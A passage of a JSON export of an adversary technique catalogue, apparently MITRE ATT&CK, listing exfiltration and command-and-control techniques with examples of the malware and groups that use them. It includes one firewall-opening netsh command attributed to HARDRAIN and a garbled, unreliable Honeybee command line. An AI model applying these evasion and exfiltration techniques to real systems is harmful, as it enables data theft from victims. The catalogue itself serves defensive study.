            "Platform: ": "Linux, macOS, Windows",
            "Data Sources: ": "File monitoring, Process monitoring, Process use of network",
            "Requires Network: ": "Yes",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "CosmicDuke",
                    "Description": "CosmicDuke exfiltrates collected files automatically over FTP to remote servers.[1]"
                },
                {
                    "Name": "Honeybee",
                    "Description": "Honeybee performs data exfiltration is accomplished through the following command-line command: from  (- --).txt.[2]"
                },
                {
                    "Name": "Rover",
                    "Description": "Rover automatically searches for files on local drives based on a predefined list of file extensions and sends them to the command and control server every 60 minutes. Rover also automatically sends keylogger files and screenshots to the C2 server on a regular timeframe.[3]"
                },
                {
                    "Name": "TINYTYPHON",
                    "Description": "When a document is found matching one of the extensions in the configuration, TINYTYPHON uploads it to the C2 server.[4]"
                },
                {
                    "Name": "USBStealer",
                    "Description": "USBStealer automatically exfiltrates collected files via removable media when an infected device is connected to the second victim after receiving commands from the first victim.[5]"
                }
            ]
        },
        "Data Compressed": {
            "Name": "Data Compressed",
            "Description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network. The compression is done separately from the exfiltration channel and is performed using a custom program or algorithm, or a more common compression library or utility such as 7zip, RAR, ZIP, or zlib.\n",
            "ID": "T1002",
            "Tactic": "Exfiltration",
            "Platform: ": "Linux, Windows, macOS",
            "Data Sources: ": "Binary file metadata, File monitoring, Process command-line parameters, Process monitoring",
            "Requires Network: ": "No",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "ADVSTORESHELL",
                    "Description": "ADVSTORESHELL compresses output data generated by command execution with a custom implementation of the Lempel–Ziv–Welch (LZW) algorithm.[1]"
                },
                {
                    "Name": "APT1",
                    "Description": "APT1 has used RAR to compress files before moving them outside of the victim network.[2]"
                },
                {
                    "Name": "APT28",
                    "Description": "APT28 used a publicly available tool to gather and compress multiple documents on the DCCC and DNC networks.[3]"
                },
                {
                    "Name": "APT3",
                    "Description": "APT3 has used tools to compress data before exfilling it.[4]"
                },
                {
                    "Name": "BRONZE BUTLER",
                    "Description": "BRONZE BUTLER has compressed data into password-protected RAR archives prior to exfiltration.[5]"
                },
                {
                    "Name": "Calisto",
                    "Description": "Calisto uses the zip -r command to compress the data collected on the local system.[6][7]"
                },
                {
                    "Name": "CopyKittens",
                    "Description": "CopyKittens uses ZPP, a .NET console program, to compress files with ZIP.[8]"
                },
                {
                    "Name": "CORALDECK",
                    "Description": "CORALDECK has created password-protected RAR, WinImage, and zip archives to be exfiltrated.[9]"
                },
                {
                    "Name": "Daserf",
                    "Description": "Daserf hides collected data in password-protected .rar archives.[10]"
                },
                {
                    "Name": "Dragonfly 2.0",
                    "Description": "Dragonfly 2.0 compressed data into .zip files prior to exfiltrating it.[11]"
                },
                {
                    "Name": "Duqu",
                    "Description": "Modules can be pushed to and executed by Duqu that copy data to a staging area, compress it, and XOR encrypt it.[12]"
                },
                {
                    "Name": "FIN6",
                    "Description": "Following data collection, FIN6 has compressed log files into a ZIP archive prior to staging and exfiltration.[13]"
                },
                {
                    "Name": "FIN8",
                    "Description": "FIN8 has used RAR to compress collected data before.[14]"
                },
                {
                    "Name": "Honeybee",
                    "Description": "Honeybee adds collected files to a temp.zip file saved in the %temp% folder, then base64 encodes it and uploads it to control server.[15]"
                },
                {
                    "Name": "iKitten",
                    "Description": "iKitten will zip up the /Library/Keychains directory before exfiltrating it.[16]"
                },
                {
                    "Name": "InvisiMole",
                    "Description": "InvisiMole uses WinRAR to compress data that is intended to be exfiltrated.[17]"
                },
                {
                    "Name": "Ke3chang",
                    "Description": "The Ke3chang group has been known to compress data before exfiltration.[18]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "Lazarus Group malware IndiaIndia saves information gathered about the victim to a file that is compressed with Zlib, encrypted, and uploaded to a C2 server. Lazarus Group malware RomeoDelta archives specified directories in .zip format, encrypts the .zip file, and uploads it to its C2 server.[19][20][21]"
                },
                {
                    "Name": "Lurid",
                    "Description": "Lurid can compress data before sending it.[22]"
                },
                {
                    "Name": "Magic Hound",
                    "Description": "Magic Hound has used RAR to stage and compress local folders.[23]"
                },
                {
                    "Name": "menuPass",
                    "Description": "menuPass has compressed files before exfiltration using TAR and RAR.[24][25]"
                },
                {
                    "Name": "OopsIE",
                    "Description": "OopsIE compresses collected files with both the GZipStream class and a simple character replacement scheme before sending them to its C2 server.[26]"
                },
                {
                    "Name": "Prikormka",
                    "Description": "After collecting documents from removable media, Prikormka compresses the collected files.[27]"
                },
                {
                    "Name": "Proton",
                    "Description": "Proton zips up files before exfiltrating them.[16]"
                },
                {
                    "Name": "Pupy",
                    "Description": "Pupy can compress data with Zip before sending it over C2.[28]"
                },
                {
                    "Name": "RunningRAT",
                    "Description": "RunningRAT contains code to compress files.[29]"
                },
                {
                    "Name": "SeaDuke",
                    "Description": "SeaDuke compressed data with zlib prior to sending it over C2.[30]"
                },
                {
                    "Name": "Sowbug",
                    "Description": "Sowbug extracted documents and bundled them into a RAR archive.[31]"
                },
                {
                    "Name": "Threat Group-3390",
                    "Description": "Threat Group-3390 has used RAR to compress, encrypt, and password-protect files prior to exfiltration.[32]"
                },
                {
                    "Name": "ZLib",
                    "Description": "The ZLib backdoor compresses communications using the standard Zlib compression library.[33]"
                }
            ]
        },
        "Data Encrypted": {
            "Name": "Data Encrypted",
            "Description": "Data is encrypted before being exfiltrated in order to hide the information that is being exfiltrated from detection or to make the exfiltration less conspicuous upon inspection by a defender. The encryption is performed by a utility, programming library, or custom algorithm on the data itself and is considered separate from any encryption performed by the command and control or file transfer protocol. Common file archive formats that can encrypt files are RAR and zip.Other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over Command and Control Channel and Exfiltration Over Alternative Protocol\n",
            "ID": "T1022",
            "Tactic": "Exfiltration",
            "Platform: ": "Linux, macOS, Windows",
            "Data Sources: ": "File monitoring, Process monitoring, Process command-line parameters, Binary file metadata",
            "Requires Network: ": "No",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "ADVSTORESHELL",
                    "Description": "ADVSTORESHELL encrypts with the 3DES algorithm and a hardcoded key prior to exfiltration.[1]"
                },
                {
                    "Name": "Agent.btz",
                    "Description": "Agent.btz saves system information into an XML file that is then XOR-encoded.[2]"
                },
                {
                    "Name": "Backdoor.Oldrea",
                    "Description": "Backdoor.Oldrea writes collected data to a temporary file in an encrypted form before exfiltration to a C2 server.[3]"
                },
                {
                    "Name": "BRONZE BUTLER",
                    "Description": "BRONZE BUTLER has compressed and encrypted data into password-protected RAR archives prior to exfiltration.[4]"
                },
                {
                    "Name": "CopyKittens",
                    "Description": "CopyKittens encrypts data with a substitute cipher prior to exfiltration.[5]"
                },
                {
                    "Name": "CORALDECK",
                    "Description": "CORALDECK has created password-protected RAR, WinImage, and zip archives to be exfiltrated.[6]"
                },
                {
                    "Name": "Daserf",
                    "Description": "Daserf hides collected data in password-protected .rar archives.[7]"
                },
                {
                    "Name": "Duqu",
                    "Description": "Modules can be pushed to and executed by Duqu that copy data to a staging area, compress it, and XOR encrypt it.[8]"
                },
                {
                    "Name": "FELIXROOT",
                    "Description": "FELIXROOT encrypts collected data with AES and Base64 and then sends it to the C2 server.[9]"
                },
                {
                    "Name": "FIN6",
                    "Description": "TRINITY malware used by FIN6 encodes data gathered from the victim with a simple substitution cipher and single-byte XOR using the OxAA key.[10]"
                },
                {
                    "Name": "FLASHFLOOD",
                    "Description": "FLASHFLOOD employs the same encoding scheme as SPACESHIP for data it stages. Data is compressed with zlib, and bytes are rotated four times before being XOR'ed with 0x23.[11]"
                },
                {
                    "Name": "Gold Dragon",
                    "Description": "Gold Dragon encrypts data using Base64 before being sent to the command and control server.[12]"
                },
                {
                    "Name": "Honeybee",
                    "Description": "Honeybee adds collected files to a temp.zip file saved in the %temp% folder, then base64 encodes it and uploads it to control server.[13]"
                },
                {
                    "Name": "InvisiMole",
                    "Description": "InvisiMole uses a variation of the XOR cipher to encrypt files before exfiltration.[14]"
                },
                {
                    "Name": "Ke3chang",
                    "Description": "Ke3chang is known to use RAR with passwords to encrypt data prior to exfiltration.[15]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "Lazarus Group malware IndiaIndia saves information gathered about the victim to a file that is compressed with Zlib, encrypted, and uploaded to a C2 server. Lazarus Group malware RomeoDelta archives specified directories in .zip format, encrypts the .zip file, and uploads it to its C2 server. A Lazarus Group malware sample encrypts data using a simple byte based XOR operation prior to exfiltration.[16][17][18][19]"
                },
                {
                    "Name": "OwaAuth",
                    "Description": "OwaAuth DES-encrypts captured credentials using the key 12345678 before writing the credentials to a log file.[20]"
                },
                {
                    "Name": "Patchwork",
                    "Description": "Patchwork encrypted the collected files' path with AES and then encoded them with base64.[21]"
                },
                {
                    "Name": "Prikormka",
                    "Description": "After collecting files and logs from the victim, Prikormka encrypts some collected data with Blowfish.[22]"
                },
                {
                    "Name": "RawPOS",
                    "Description": "RawPOS encodes credit card data it collected from the victim with XOR.[23][24][25]"
                },
                {
                    "Name": "Reaver",
                    "Description": "Reaver encrypts collected data with an incremental XOR key prior to exfiltration.[26]"
                },
                {
                    "Name": "RGDoor",
                    "Description": "RGDoor encrypts files with XOR before sending them back to the C2 server.[27]"
                },
                {
                    "Name": "SPACESHIP",
                    "Description": "Data SPACESHIP copies to the staging area is compressed with zlib. Bytes are rotated by four positions and XOR'ed with 0x23.[11]"
                },
                {
                    "Name": "T9000",
                    "Description": "T9000 encrypts collected data using a single byte XOR key.[28]"
                },
                {
                    "Name": "Threat Group-3390",
                    "Description": "Threat Group-3390 has used RAR to compress, encrypt, and password-protect files prior to exfiltration.[29]"
                },
                {
                    "Name": "VERMIN",
                    "Description": "VERMIN encrypts the collected files using 3-DES.[30]"
                }
            ]
        },
        "Data Transfer Size Limits": {
            "Name": "Data Transfer Size Limits",
            "Description": "An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.\n",
            "ID": "T1030",
            "Tactic": "Exfiltration",
            "Platform: ": "Linux, macOS, Windows",
            "Data Sources: ": "Packet capture, Netflow/Enclave netflow, Process use of network, Process monitoring",
            "Requires Network: ": "Yes",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Carbanak",
                    "Description": "Carbanak exfiltrates data in compressed chunks if a message is larger than 4096 bytes .[1]"
                },
                {
                    "Name": "Helminth",
                    "Description": "Helminth splits data into chunks up to 23 bytes and sends the data in DNS queries to its C2 server.[2]"
                },
                {
                    "Name": "OopsIE",
                    "Description": "OopsIE exfiltrates command output and collected files to its C2 server in 1500-byte blocks.[3]"
                },
                {
                    "Name": "POSHSPY",
                    "Description": "POSHSPY uploads data in 2048-byte chunks.[4]"
                },
                {
                    "Name": "Threat Group-3390",
                    "Description": "Threat Group-3390 actors have split RAR files for exfiltration into parts.[5]"
                }
            ]
        },
        "Exfiltration Over Alternative Protocol": {
            "Name": "Exfiltration Over Alternative Protocol",
            "Description": "Data exfiltration is performed with a different protocol from the main command and control protocol or channel. The data is likely to be sent to an alternate network location from the main command and control server. Alternate protocols include FTP, SMTP, HTTP/S, DNS, or some other network protocol. Different channels could include Internet Web services such as cloud storage.\n",
            "ID": "T1048",
            "Tactic": "Exfiltration",
            "Platform: ": "Linux, macOS, Windows",
            "Data Sources: ": "User interface, Process monitoring, Process use of network, Packet capture, Netflow/Enclave netflow, Network protocol analysis",
            "Requires Network: ": "Yes",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "BITSAdmin",
                    "Description": "BITSAdmin can be used to create BITS Jobs to upload files from a compromised host.[1]"
                },
                {
                    "Name": "Cherry Picker",
                    "Description": "Cherry Picker exfiltrates files over FTP.[2]"
                },
                {
                    "Name": "CosmicDuke",
                    "Description": "CosmicDuke exfiltrates collected files over FTP or WebDAV. Exfiltration servers can be separately configured from C2 servers.[3]"
                },
                {
                    "Name": "FIN8",
                    "Description": "FIN8 has used FTP to exfiltrate collected data.[4]"
                },
                {
                    "Name": "FTP",
                    "Description": "FTP may be used to exfiltrate data separate from the main command and control protocol.[5]"
                },
                {
                    "Name": "HAMMERTOSS",
                    "Description": "HAMMERTOSS exfiltrates data by uploading it to accounts created by the actors on Web cloud storage providers for the adversaries to retrieve later.[6]"
                },
                {
                    "Name": "Hydraq",
                    "Description": "Hydraq connects to a predefined domain on port 443 to exfil gathered information.[7]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "Lazarus Group malware SierraBravo-Two generates an email message via SMTP containing information about newly infected victims.[8][9]"
                },
                {
                    "Name": "OilRig",
                    "Description": "OilRig has exfiltrated data over FTP separately from its primary C2 channel over DNS.[10]"
                },
                {
                    "Name": "Remsec",
                    "Description": "Remsec can exfiltrate data via a DNS tunnel or email, separately from its C2 channel.[11]"
                },
                {
                    "Name": "Thrip",
                    "Description": "Thrip has used WinSCP to exfiltrate data from a targeted organization over FTP.[12]"
                }
            ]
        },
        "Exfiltration Over Command and Control Channel": {
            "Name": "Exfiltration Over Command and Control Channel",
            "Description": "Data exfiltration is performed over the Command and Control channel. Data is encoded into the normal communications channel using the same protocol as command and control communications.\n",
            "ID": "T1041",
            "Tactic": "Exfiltration",
            "Platform: ": "Linux, macOS, Windows",
            "Data Sources: ": "User interface, Process monitoring",
            "Requires Network: ": "Yes",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "ADVSTORESHELL",
                    "Description": "ADVSTORESHELL exfiltrates data over the same channel used for C2.[1]"
                },
                {
                    "Name": "APT3",
                    "Description": "APT3 has a tool that exfiltrates data over the C2 channel.[2]"
                },
                {
                    "Name": "BACKSPACE",
                    "Description": "Adversaries can direct BACKSPACE to upload files to the C2 Server.[3]"
                },
                {
                    "Name": "Bankshot",
                    "Description": "Bankshot exfiltrates data over its C2 channel.[4]"
                },
                {
                    "Name": "CallMe",
                    "Description": "CallMe exfiltrates data to its C2 server over the same protocol as C2 communications.[5]"
                },
                {
                    "Name": "Gamaredon Group",
                    "Description": "A Gamaredon Group file stealer transfers collected files to a hardcoded C2 server.[6]"
                },
                {
                    "Name": "Ke3chang",
                    "Description": "Ke3chang transferred compressed and encrypted RAR files containing exfiltration through the established backdoor command and control channel during operations.[7]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "Lazarus Group malware IndiaIndia saves information gathered about the victim to a file that is uploaded to one of its 10 C2 servers. Another Lazarus Group malware sample also performs exfiltration over the C2 channel.[8][9][10]"
                },
                {
                    "Name": "MobileOrder",
                    "Description": "MobileOrder exfiltrates data to its C2 server over the same protocol as C2 communications.[5]"
                },
                {
                    "Name": "NETEAGLE",
                    "Description": "NETEAGLE is capable of reading files over the C2 channel.[3]"
                },
                {
                    "Name": "OopsIE",
                    "Description": "OopsIE can upload files from the victim's machine to its C2 server.[11]"
                },
                {
                    "Name": "Proxysvc",
                    "Description": "Proxysvc performs data exfiltration over the control server channel using a custom protocol.[12]"
                },
                {
                    "Name": "Psylo",
                    "Description": "Psylo exfiltrates data to its C2 server over the same protocol as C2 communications.[5]"
                },
                {
                    "Name": "Pteranodon",
                    "Description": "Pteranodon exfiltrates screenshot files to its C2 server.[6]"
                },
                {
                    "Name": "Pupy",
                    "Description": "Pupy can send screenshots files, keylogger data, files, and recorded audio back to the C2 server.[13]"
                },
                {
                    "Name": "ROKRAT",
                    "Description": "ROKRAT sends collected files back over same C2 channel.[14]"
                },
                {
                    "Name": "Stealth Falcon",
                    "Description": "After data is collected by Stealth Falcon malware, it is exfiltrated over the existing C2 channel.[15]"
                }
            ]
        },
        "Exfiltration Over Other Network Medium": {
            "Name": "Exfiltration Over Other Network Medium",
            "Description": "Exfiltration could occur over a different network medium than the command and control channel. If the command and control network is a wired Internet connection, the exfiltration may occur, for example, over a WiFi connection, modem, cellular data connection, Bluetooth, or another radio frequency (RF) channel. Adversaries could choose to do this if they have sufficient access or proximity, and the connection might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.\n",
            "ID": "T1011",
            "Tactic": "Exfiltration",
            "Platform: ": "Linux, macOS, Windows",
            "Data Sources: ": "User interface, Process monitoring",
            "Requires Network: ": "Yes",
            "Contributors: ": "Itzik Kotler, SafeBreach",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Flame",
                    "Description": "Flame has a module named BeetleJuice that contains Bluetooth functionality that may be used in different ways, including transmitting encoded information from the infected system over the Bluetooth protocol, acting as a Bluetooth beacon, and identifying other Bluetooth devices in the vicinity.[1]"
                }
            ]
        },
        "Exfiltration Over Physical Medium": {
            "Name": "Exfiltration Over Physical Medium",
            "Description": "In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a physical medium or device introduced by a user. Such media could be an external hard drive, USB drive, cellular phone, MP3 player, or other removable storage and processing device. The physical medium or device could be used as the final exfiltration point or to hop between otherwise disconnected systems.\n",
            "ID": "T1052",
            "Tactic": "Exfiltration",
            "Platform: ": "Linux, macOS, Windows",
            "Data Sources: ": "Data loss prevention, File monitoring",
            "Requires Network: ": "No",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Agent.btz",
                    "Description": "Agent.btz creates a file named thumb.dd on all USB flash drives connected to the victim. This file contains information about the infected system and activity logs.[1]"
                },
                {
                    "Name": "Remsec",
                    "Description": "Remsec contains a module to move data from airgapped networks to Internet-connected systems by using a removable USB device.[2]"
                },
                {
                    "Name": "SPACESHIP",
                    "Description": "SPACESHIP copies staged data to removable drives when they are inserted into the system.[3]"
                },
                {
                    "Name": "USBStealer",
                    "Description": "USBStealer exfiltrates collected files via removable media from air-gapped victims.[4]"
                }
            ]
        },
        "Scheduled Transfer": {
            "Name": "Scheduled Transfer",
            "Description": "Data exfiltration may be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability.When scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over Command and Control Channel and Exfiltration Over Alternative Protocol.\n",
            "ID": "T1029",
            "Tactic": "Exfiltration",
            "Platform: ": "Linux, macOS, Windows",
            "Data Sources: ": "Netflow/Enclave netflow, Process use of network, Process monitoring",
            "Requires Network: ": "Yes",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "ADVSTORESHELL",
                    "Description": "ADVSTORESHELL collects, compresses, encrypts, and exfiltrates data to the C2 server every 10 minutes.[1]"
                },
                {
                    "Name": "Cobalt Strike",
                    "Description": "Cobalt Strike can set its \"beacon\" payload to reach out to the C2 server on an arbitrary and random interval. In addition it will break large data sets into smaller chunks for exfiltration.[2]"
                },
                {
                    "Name": "Dipsind",
                    "Description": "Dipsind can be configured to only run during normal working hours, which would make its communications harder to distinguish from normal traffic.[3]"
                },
                {
                    "Name": "Kazuar",
                    "Description": "Kazuar can sleep for a specific time and be set to communicate at specific intervals.[4]"
                },
                {
                    "Name": "Linfo",
                    "Description": "Linfo creates a backdoor through which remote attackers can change the frequency at which compromised hosts contact remote C2 infrastructure.[5]"
                },
                {
                    "Name": "POWERSTATS",
                    "Description": "POWERSTATS can sleep for a given number of seconds.[6]"
                }
            ]
        },
        "Commonly Used Port": {
            "Name": "Commonly Used Port",
            "Description": "Adversaries may communicate over a commonly used port to bypass firewalls or network detection systems and to blend with normal network activity to avoid more detailed inspection. They may use commonly open ports such asTCP:80 (HTTP)TCP:443 (HTTPS)TCP:25 (SMTP)TCP/UDP:53 (DNS)They may use the protocol associated with the port or a completely different protocol. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), examples of common ports are TCP/UDP:135 (RPC)TCP/UDP:22 (SSH)TCP/UDP:3389 (RDP)\n",
            "ID": "T1043",
            "Tactic": "Command And Control",
            "Platform: ": "Linux, macOS, Windows",
            "Data Sources: ": "Packet capture, Netflow/Enclave netflow, Process use of network, Process monitoring",
            "Requires Network: ": "Yes",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "ADVSTORESHELL",
                    "Description": "A variant of ADVSTORESHELL attempts communication to the C2 server over HTTP on port 443.[1]"
                },
                {
                    "Name": "APT19",
                    "Description": "APT19 used TCP port 80 for C2.[2]"
                },
                {
                    "Name": "APT3",
                    "Description": "APT3 uses commonly used ports (like HTTPS/443) for command and control.[3]"
                },
                {
                    "Name": "APT37",
                    "Description": "APT37 has used port 8080 for C2.[4]"
                },
                {
                    "Name": "BADCALL",
                    "Description": "BADCALL uses port 8000 and 443 for C2.[5]"
                },
                {
                    "Name": "BBSRAT",
                    "Description": "BBSRAT uses HTTP TCP port 80 and HTTPS TCP port 443 for communications.[6]"
                },
                {
                    "Name": "Bisonal",
                    "Description": "Bisonal uses 443 for C2 communications.[7]"
                },
                {
                    "Name": "Briba",
                    "Description": "Briba connects to external C2 infrastructure over port 443.[8]"
                },
                {
                    "Name": "Calisto",
                    "Description": "Calisto attempted to contact the C2 server over TCP using port 80.[9]"
                },
                {
                    "Name": "Carbanak",
                    "Description": "Carbanak uses Port Numbers 443 and 80 for the C2 server.[10]"
                },
                {
                    "Name": "Cobalt Strike",
                    "Description": "Cobalt Strike uses a custom command and control protocol that communicates over commonly used ports. The C2 protocol is encapsulated in common application layer protocols.[11]"
                },
                {
                    "Name": "Comnie",
                    "Description": "Comnie uses Port Numbers 80, 8080, 8000, and 443 for communication to the C2 servers.[12]"
                },
                {
                    "Name": "Derusbi",
                    "Description": "Derusbi beacons to destination port 443.[13]"
                },
                {
                    "Name": "Dragonfly 2.0",
                    "Description": "Dragonfly 2.0 used SMB over ports 445 or 139 for C2. The group also established encrypted connections over port 443.[14][15]"
                },
                {
                    "Name": "Duqu",
                    "Description": "Duqu uses a custom command and control protocol that communicates over commonly used ports, and is frequently encapsulated by application layer protocols.[16]"
                },
                {
                    "Name": "ELMER",
                    "Description": "ELMER uses HTTP over port 443 for command and control.[17]"
                },
                {
                    "Name": "EvilGrab",
                    "Description": "EvilGrab uses port 8080 for C2.[18]"
                },
                {
                    "Name": "FELIXROOT",
                    "Description": "FELIXROOT uses port 443 for C2 communications.[19]"
                },
                {
                    "Name": "FIN7",
                    "Description": "FIN7 has used ports 53, 80, 443, and 8080 for C2.[20]"
                },
                {
                    "Name": "FIN8",
                    "Description": "FIN8 has tunneled RDP backdoors over port 443.[21]"
                },
                {
                    "Name": "FTP",
                    "Description": "FTP operates over ports 21 and 20.[22]"
                },
                {
                    "Name": "HARDRAIN",
                    "Description": "HARDRAIN binds and listens on port 443.[23]"
                },
                {
                    "Name": "Hi-Zor",
                    "Description": "Hi-Zor communicates with its C2 server over port 443.[24]"
                },
                {
                    "Name": "HTTPBrowser",
                    "Description": "One HTTPBrowser variant connected to its C2 server over port 8080.[25]"
                },
                {
                    "Name": "InvisiMole",
                    "Description": "InvisiMole uses port 80 for C2.[26]"
                },
                {
                    "Name": "KEYMARBLE",
                    "Description": "KEYMARBLE uses port 443 for C2.[27]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "Some Lazarus Group malware uses a list of ordered port numbers to choose a port for C2 traffic, which includes commonly used ports such as 443, 53, 80, 25, and 8080.[28][29]"
                },
                {
                    "Name": "LOWBALL",
                    "Description": "LOWBALL command and control occurs via HTTPS over port 443.[30]"
                },
                {
                    "Name": "Magic Hound",
                    "Description": "Magic Hound malware has communicated with C2 servers over port 6667 (for IRC) and port 8080.[31]"
                },
                {
                    "Name": "MirageFox",
                    "Description": "MirageFox uses port 80 for C2.[32]"
                },
                {
                    "Name": "Mis-Type",
                    "Description": "Mis-Type communicates over common ports such as TCP 80, 443, and 25.[33]"
                },
                {
                    "Name": "Misdat",
                    "Description": "Misdat network traffic communicates over common ports like 80, 443, or 1433.[33]"
                },
                {
                    "Name": "Mivast",
                    "Description": "Mivast communicates over port 80 for C2.[34]"
                },
                {
                    "Name": "MoonWind",
                    "Description": "MoonWind communicates over ports 80, 443, 53, and 8080 via raw sockets instead of the protocols usually associated with the ports.[35]"
                },
                {
                    "Name": "Naid",
                    "Description": "Naid connects to external C2 infrastructure over port 443.[36]"
                },
                {
                    "Name": "Nidiran",
                    "Description": "Nidiran communicates with its C2 domain over ports 443 and 8443.[37]"
                },
                {
                    "Name": "Pasam",
                    "Description": "Pasam connects to external C2 infrastructure and opens a backdoor over port 443.[38]"
                },
                {
                    "Name": "PlugX",
                    "Description": "PlugX has beaconed to its C2 over port 443.[18]"
                },
                {
                    "Name": "PowerDuke",
                    "Description": "PowerDuke connects over 443 for C2.[39]"
                },
                {
                    "Name": "POWERSTATS",
                    "Description": "POWERSTATS has used port 80 for C2.[40]"
                },
                {
                    "Name": "Proxysvc",
                    "Description": "Proxysvc uses port 443 for the control server communications.[41]"
                },
                {
                    "Name": "RATANKBA",
                    "Description": "RATANKBA uses port 443 for C2.[42]"
                },
                {
                    "Name": "RedLeaves",
                    "Description": "RedLeaves uses a specific port of 443 and can also use ports 53 and 80 for C2. One RedLeaves variant uses HTTP over port 443 to connect to its C2 server.[18][43]"
                },
                {
                    "Name": "RIPTIDE",
                    "Description": "RIPTIDE is a RAT that communicates with HTTP.[44]"
                },
                {
                    "Name": "S-Type",
                    "Description": "S-Type uses ports 80, 443, and 8080 for C2.[33]"
                },
                {
                    "Name": "Shamoon",
                    "Description": "Shamoon has used TCP port 8080 for C2.[45]"
                },
                {
                    "Name": "Threat Group-3390",
                    "Description": "C2 traffic for most Threat Group-3390 tools occurs over Port Numbers 53, 80, and 443.[46]"
                },
                {
                    "Name": "TrickBot",
                    "Description": "TrickBot uses port 443 for C2 communications.[47][48]"
                },
                {
                    "Name": "TYPEFRAME",
                    "Description": "TYPEFRAME variants can use ports 443, 8443, and 8080 for communications.[49]"
                },
                {
                    "Name": "Volgmer",
                    "Description": "Some Volgmer variants use ports 8080 and 8000 for C2.[50][51][52]"
                },
                {
                    "Name": "Wiarp",
                    "Description": "Wiarp connects to external C2 infrastructure over the HTTP port.[53]"
                }
            ]
        },
        "Communication Through Removable Media": {
            "Name": "Communication Through Removable Media",
            "Description": "Adversaries can perform command and control between compromised hosts on potentially disconnected networks using removable media to transfer commands from system to system. Both systems would need to be compromised, with the likelihood that an Internet-connected system was compromised first and the second through lateral movement by Replication Through Removable Media. Commands and files would be relayed from the disconnected system to the Internet-connected system to which the adversary has direct access.\n",
            "ID": "T1092",
            "Tactic": "Command And Control",
            "Platform: ": "Linux, macOS, Windows",
            "Data Sources: ": "File monitoring, Data loss prevention",
            "Requires Network: ": "No",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT28",
                    "Description": "APT28 uses a tool that captures information from air-gapped computers via an infected USB and transfers it to network-connected computer when the USB is inserted.[1]"
                },
                {
                    "Name": "CHOPSTICK",
                    "Description": "Part of APT28's operation involved using CHOPSTICK modules to copy itself to air-gapped machines, using files written to USB sticks to transfer data and command traffic.[2][3][1]"
                },
                {
                    "Name": "USBStealer",
                    "Description": "USBStealer drops commands for a second victim onto a removable media drive inserted into the first victim, and commands are executed when the drive is inserted into the second victim.[4]"
                }
            ]
        },
        "Connection Proxy": {
            "Name": "Connection Proxy",
            "Description": "A connection proxy is used to direct network traffic between systems or act as an intermediary for network communications. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap. [1]The definition of a proxy can also be expanded out to encompass trust relationships between networks in peer-to-peer, mesh, or trusted connections between networks consisting of hosts or systems that regularly communicate with each other.The network may be within a single organization or across organizations with trust relationships. Adversaries could use these types of relationships to manage command and control communications, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion.\n",
            "ID": "T1090",
            "Tactic": "Command And Control",
            "Platform: ": "Linux, macOS, Windows",
            "Data Sources: ": "Process use of network, Process monitoring, Netflow/Enclave netflow, Packet capture",
            "Requires Network: ": "Yes",
            "Contributors: ": "Walker Johnson",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT28",
                    "Description": "APT28 used other victims as proxies to relay command traffic, for instance using a compromised Georgian military email server as a hop point to NATO victims. The group has also used a tool that acts as a proxy to allow C2 even if the victim is behind a router. APT28 has also used a machine to relay and obscure communications between CHOPSTICK and their server.[2][3][4]"
                },
                {
                    "Name": "APT3",
                    "Description": "An APT3 downloader establishes SOCKS5 connections for its initial C2.[5]"
                },
                {
                    "Name": "BACKSPACE",
                    "Description": "The \"ZJ\" variant of BACKSPACE allows \"ZJ link\" infections with Internet access to relay traffic from \"ZJ listen\" to a command server.[6]"
                },
                {
                    "Name": "BADCALL",
                    "Description": "BADCALL functions as a proxy server between the victim and C2 server.[7]"
                },
                {
                    "Name": "CHOPSTICK",
                    "Description": "CHOPSTICK used a proxy server between victims and the C2 server.[8]"
                },
                {
                    "Name": "Cobalt Strike",
                    "Description": "Cobalt Strike can be configured to have commands relayed over a peer-to-peer network of infected hosts. This can be used to limit the number of egress points, or provide access to a host without direct internet access.[9]"
                },
                {
                    "Name": "Duqu",
                    "Description": "Duqu can be configured to have commands relayed over a peer-to-peer network of infected hosts if some of the hosts do not have Internet access.[10]"
                },
                {
                    "Name": "FLIPSIDE",
                    "Description": "FLIPSIDE is a simple proxy that creates an outbound RDP connection.[11]"
                },
                {
                    "Name": "Gazer",
                    "Description": "Gazer identifies a proxy server if it exists and uses it to make HTTP requests.[12]"
                },
                {
                    "Name": "HARDRAIN",
                    "Description": "HARDRAIN uses the command cmd.exe /c netsh firewall add portopening TCP 443 \"adp\" and makes the victim machine function as a proxy server.[13]"
                },
                {
                    "Name": "Hikit",
                    "Description": "Hikit supports peer connections.[14]"
                },
                {
                    "Name": "HTRAN",
                    "Description": "HTRAN is used for proxying connections to obfuscate command and control infrastructure.[15]"
                },
                {
                    "Name": "InvisiMole",
                    "Description": "InvisiMole can function as a proxy to create a serve that relays communication between the client and C&C server.[16]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "Lazarus Group uses multiple proxies to obfuscate network traffic from victims.[17]"
                },
